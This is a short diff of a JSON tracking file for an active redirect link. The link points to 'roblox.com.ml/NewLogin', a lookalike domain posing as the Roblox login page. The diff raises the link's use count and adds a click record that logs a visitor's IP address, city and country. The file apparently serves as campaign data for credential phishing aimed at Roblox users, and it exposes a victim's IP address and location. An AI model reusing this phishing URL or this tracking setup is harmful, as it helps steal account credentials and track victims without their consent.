@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 718,
+    "useCount": 719,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5856,6 +5856,14 @@
         "city": "Hanoi",
         "flag": "🇻🇳",
         "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777139505816,
+        "ip": "94.62.194.107",
+        "country": "Portugal",
+        "city": "Amadora",
+        "flag": "🇵🇹",
+        "countryCode": "PT"
       }
     ]
   },
